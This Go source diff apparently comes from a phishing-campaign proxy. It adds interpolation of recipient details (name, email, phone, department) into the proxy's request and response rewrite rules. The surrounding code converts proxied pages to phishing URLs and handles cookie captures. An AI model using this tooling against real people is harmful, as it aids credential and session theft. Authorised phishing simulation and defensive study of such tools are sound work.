@@ -74,6 +74,13 @@ var (
 	MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|test|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 )
 
+// VariablesContext holds recipient and campaign data for template variable interpolation
+type VariablesContext struct {
+	Data    map[string]string                    // the variable data map
+	Config  *service.ProxyServiceVariablesConfig // the variables configuration
+	Enabled bool                                 // whether variables are enabled
+}
+
 // RequestContext holds all the context data for a proxy request
 type RequestContext struct {
 	SessionID           string
@@ -709,7 +716,7 @@ func (m *ProxyHandler) processRequestWithSessionContext(req *http.Request, reqCt
 	m.normalizeRequestHeaders(req, reqCtx.Session)
 
 	// apply replace and capture rules
-	m.onRequestBody(req, reqCtx.Session)
+	m.onRequestBody(req, reqCtx.Session, reqCtx.ProxyConfig)
 	m.onRequestHeader(req, reqCtx.Session)
 
 	// patch query parameters
@@ -953,11 +960,16 @@ func (m *ProxyHandler) rewriteResponseHeadersWithContext(resp *http.Response, re
 
 	// apply custom replacement rules for response headers (after all hardcoded changes)
 	if reqCtx.Session != nil {
-		m.applyCustomResponseHeaderReplacements(resp, reqCtx.Session)
+		varCtx := m.buildVariablesContext(resp.Request.Context(), reqCtx.Session, reqCtx.ProxyConfig)
+		m.applyCustomResponseHeaderReplacementsWithVariables(resp, reqCtx.Session, varCtx)
 	}
 }
 
 func (m *ProxyHandler) applyCustomResponseHeaderReplacements(resp *http.Response, session *service.ProxySession) {
+	m.applyCustomResponseHeaderReplacementsWithVariables(resp, session, nil)
+}
+
+func (m *ProxyHandler) applyCustomResponseHeaderReplacementsWithVariables(resp *http.Response, session *service.ProxySession, varCtx *VariablesContext) {
 	// get all headers as a string
 	var buf bytes.Buffer
 	resp.Header.Write(&buf)
@@ -969,7 +981,7 @@ func (m *ProxyHandler) applyCustomResponseHeaderReplacements(resp *http.Response
 		if hCfg.Rewrite != nil {
 			for _, replacement := range hCfg.Rewrite {
 				if replacement.From == "response_header" || replacement.From == "any" {
-					headers = m.applyReplacement(headers, replacement, session.ID)
+					headers = m.applyReplacementWithVariables(headers, replacement, session.ID, varCtx)
 				}
 			}
 		}
@@ -1019,7 +1031,10 @@ func (m *ProxyHandler) rewriteResponseBodyWithContext(resp *http.Response, reqCt
 
 	body = m.patchUrls(reqCtx.ConfigMap, body, CONVERT_TO_PHISHING_URLS)
 	body = m.applyURLPathRewrites(body, reqCtx)
-	body = m.applyCustomReplacements(body, reqCtx.Session)
+
+	// build variables context for template interpolation
+	varCtx := m.buildVariablesContext(resp.Request.Context(), reqCtx.Session, reqCtx.ProxyConfig)
+	body = m.applyCustomReplacementsWithVariables(body, reqCtx.Session, varCtx)
 
 	// apply obfuscation if enabled
 	if reqCtx.Campaign != nil && strings.Contains(contentType, "text/html") {
@@ -1458,7 +1473,7 @@ func (m *ProxyHandler) initializeRequiredCaptures(session *service.ProxySession)
 	}
 }
 
-func (m *ProxyHandler) onRequestBody(req *http.Request, session *service.ProxySession) {
+func (m *ProxyHandler) onRequestBody(req *http.Request, session *service.ProxySession, proxyConfig *service.ProxyServiceConfigYAML) {
 	if req.Body == nil {
 		return
 	}
@@ -1477,7 +1492,9 @@ func (m *ProxyHandler) onRequestBody(req *http.Request, session *service.ProxySe
 		}
 	}
 
-	m.applyRequestBodyReplacements(req, session)
+	// build variables context using the proxy config passed from caller
+	varCtx := m.buildVariablesContext(req.Context(), session, proxyConfig)
+	m.applyRequestBodyReplacementsWithVariables(req, session, varCtx)
 }
 
 func (m *ProxyHandler) onRequestHeader(req *http.Request, session *service.ProxySession) {
@@ -2326,6 +2343,10 @@ func (m *ProxyHandler) createCookieBundle(cookieCaptures map[string]map[string]s
 }
 
 func (m *ProxyHandler) applyRequestBodyReplacements(req *http.Request, session *service.ProxySession) {
+	m.applyRequestBodyReplacementsWithVariables(req, session, nil)
+}
+
+func (m *ProxyHandler) applyRequestBodyReplacementsWithVariables(req *http.Request, session *service.ProxySession, varCtx *VariablesContext) {
 	if req.Body == nil {
 		return
 	}
@@ -2338,7 +2359,7 @@ func (m *ProxyHandler) applyRequestBodyReplacements(req *http.Request, session *
 		if hCfg.Rewrite != nil {
 			for _, replacement := range hCfg.Rewrite {
 				if replacement.From == "" || replacement.From == "request_body" || replacement.From == "any" {
-					body = m.applyReplacement(body, replacement, session.ID)
+					body = m.applyReplacementWithVariables(body, replacement, session.ID, varCtx)
 				}
 			}
 		}
@@ -2348,13 +2369,17 @@ func (m *ProxyHandler) applyRequestBodyReplacements(req *http.Request, session *
 }
 
 func (m *ProxyHandler) applyCustomReplacements(body []byte, session *service.ProxySession) []byte {
+	return m.applyCustomReplacementsWithVariables(body, session, nil)
+}
+
+func (m *ProxyHandler) applyCustomReplacementsWithVariables(body []byte, session *service.ProxySession, varCtx *VariablesContext) []byte {
 	// only apply rewrite rules for the current host
 	if hostConfig, ok := session.Config.Load(session.TargetDomain); ok {
 		hCfg := hostConfig.(service.ProxyServiceDomainConfig)
 		if hCfg.Rewrite != nil {
 			for _, replacement := range hCfg.Rewrite {
 				if replacement.From == "" || replacement.From == "response_body" || replacement.From == "any" {
-					body = m.applyReplacement(body, replacement, session.ID)
+					body = m.applyReplacementWithVariables(body, replacement, session.ID, varCtx)
 				}
 			}
 		}
@@ -2379,6 +2404,21 @@ func (m *ProxyHandler) applyCustomReplacementsWithoutSession(body []byte, config
 }
 
 func (m *ProxyHandler) applyReplacement(body []byte, replacement service.ProxyServiceReplaceRule, sessionID string) []byte {
+	return m.applyReplacementWithVariables(body, replacement, sessionID, nil)
+}
+
+// applyReplacementWithVariables applies replacement with optional template variable interpolation
+func (m *ProxyHandler) applyReplacementWithVariables(body []byte, replacement service.ProxyServiceReplaceRule, sessionID string, varCtx *VariablesContext) []byte {
+	// interpolate variables in the replacement value if enabled
+	replaceValue := replacement.Replace
+	if varCtx != nil && varCtx.Enabled && varCtx.Data != nil {
+		replaceValue = m.interpolateVariables(replaceValue, varCtx)
+	}
+
+	// create a copy of the replacement with the interpolated value
+	interpolatedReplacement := replacement
+	interpolatedReplacement.Replace = replaceValue
+
 	// default to regex engine if not specified
 	engine := replacement.Engine
 	if engine == "" {
@@ -2387,13 +2427,149 @@ func (m *ProxyHandler) applyReplacement(body []byte, replacement service.ProxySe
 
 	switch engine {
 	case "regex":
-		return m.applyRegexReplacement(body, replacement, sessionID)
+		return m.applyRegexReplacement(body, interpolatedReplacement, sessionID)
 	case "dom":
-		return m.applyDomReplacement(body, replacement, sessionID)
+		return m.applyDomReplacement(body, interpolatedReplacement, sessionID)
 	default:
 		m.logger.Errorw("unsupported replacement engine", "engine", engine, "sessionID", sessionID)
 		return body
 	}
+}
+
+// interpolateVariables replaces only explicitly allowed template variables in a string
+// this uses simple string replacement to avoid destroying legitimate {{.Something}} content
+// in the proxied site that we don't control
+func (m *ProxyHandler) interpolateVariables(input string, varCtx *VariablesContext) string {
+	if varCtx == nil || !varCtx.Enabled || varCtx.Data == nil {
+		return input
+	}
+
+	// check if input contains any template syntax
+	if !strings.Contains(input, "{{") {
+		return input
+	}
+
+	result := input
+
+	// determine which variables to replace
+	var allowedVars []string
+	if varCtx.Config != nil && len(varCtx.Config.Allowed) > 0 {
+		// only replace explicitly allowed variables
+		allowedVars = varCtx.Config.Allowed
+	} else {
+		// all variables are allowed - get keys from data map
+		allowedVars = make([]string, 0, len(varCtx.Data))
+		for varName := range varCtx.Data {
+			allowedVars = append(allowedVars, varName)
+		}
+	}
+
+	// replace only the allowed variables with simple string replacement
+	// this preserves any other {{.Something}} patterns in the content
+	for _, varName := range allowedVars {
+		if val, ok := varCtx.Data[varName]; ok {
+			placeholder := "{{." + varName + "}}"
+			result = strings.ReplaceAll(result, placeholder, val)
+		}
+	}
+
+	return result
+}
+
+// buildVariablesContext creates a VariablesContext from session and recipient data
+func (m *ProxyHandler) buildVariablesContext(ctx context.Context, session *service.ProxySession, proxyConfig *service.ProxyServiceConfigYAML) *VariablesContext {
+	// check if variables are enabled in the config
+	if proxyConfig == nil || proxyConfig.Global == nil || proxyConfig.Global.Variables == nil || !proxyConfig.Global.Variables.Enabled {
+		return &VariablesContext{Enabled: false}
+	}
+
+	varCtx := &VariablesContext{
+		Config:  proxyConfig.Global.Variables,
+		Enabled: true,
+		Data:    make(map[string]string),
+	}
+
+	// if no session or recipient ID, return empty context
+	if session == nil || session.RecipientID == nil {
+		return varCtx
+	}
+
+	// fetch recipient data
+	recipientRepo := repository.Recipient{DB: m.CampaignRecipientRepository.DB}
+	recipient, err := recipientRepo.GetByID(ctx, session.RecipientID, &repository.RecipientOption{})
+	if err != nil {
+		m.logger.Debugw("failed to get recipient for variables context", "error", err, "recipientID", session.RecipientID)
+		return varCtx
+	}
+
+	// populate recipient fields
+	varCtx.Data["rID"] = session.ID
+	if v, err := recipient.FirstName.Get(); err == nil {
+		varCtx.Data["FirstName"] = v.String()
+	}
+	if v, err := recipient.LastName.Get(); err == nil {
+		varCtx.Data["LastName"] = v.String()
+	}
+	if v, err := recipient.Email.Get(); err == nil {
+		varCtx.Data["Email"] = v.String()
+		varCtx.Data["To"] = v.String() // alias
+	}
+	if v, err := recipient.Phone.Get(); err == nil {
+		varCtx.Data["Phone"] = v.String()
+	}
+	if v, err := recipient.ExtraIdentifier.Get(); err == nil {
+		varCtx.Data["ExtraIdentifier"] = v.String()
+	}
+	if v, err := recipient.Position.Get(); err == nil {
+		varCtx.Data["Position"] = v.String()
+	}
+	if v, err := recipient.Department.Get(); err == nil {
+		varCtx.Data["Department"] = v.String()
+	}
+	if v, err := recipient.City.Get(); err == nil {
+		varCtx.Data["City"] = v.String()
+	}
+	if v, err := recipient.Country.Get(); err == nil {
+		varCtx.Data["Country"] = v.String()
+	}
+	if v, err := recipient.Misc.Get(); err == nil {
+		varCtx.Data["Misc"] = v.String()
+	}
+
+	// note: sender fields (From, FromName, FromEmail, Subject) and custom fields
+	// are not available in proxy context as they come from email templates
+	// they are initialized as empty strings for safety
+	varCtx.Data["From"] = ""
+	varCtx.Data["FromName"] = ""
+	varCtx.Data["FromEmail"] = ""
+	varCtx.Data["Subject"] = ""
+	varCtx.Data["BaseURL"] = ""
+	varCtx.Data["URL"] = ""
+	varCtx.Data["CustomField1"] = ""
+	varCtx.Data["CustomField2"] = ""
+	varCtx.Data["CustomField3"] = ""
+	varCtx.Data["CustomField4"] = ""
+
+	return varCtx
+}
+
+// getProxyConfig fetches and parses the proxy configuration for a given proxy ID
+func (m *ProxyHandler) getProxyConfig(ctx context.Context, proxyID *uuid.UUID) (*service.ProxyServiceConfigYAML, error) {
+	if proxyID == nil {
+		return nil, fmt.Errorf("proxy ID is nil")
+	}
+
+	proxyEntry, err := m.ProxyRepository.GetByID(ctx, proxyID, &repository.ProxyOption{})
+	if err != nil {
+		return nil, fmt.Errorf("failed to fetch proxy config: %w", err)
+	}
+
+	proxyConfig, err := m.parseProxyConfig(proxyEntry.ProxyConfig.MustGet().String())
+	if err != nil {
+		return nil, fmt.Errorf("failed to parse proxy config: %w", err)
+	}
+
+	return proxyConfig, nil
 }
 
 // applyRegexReplacement applies regex-based replacement
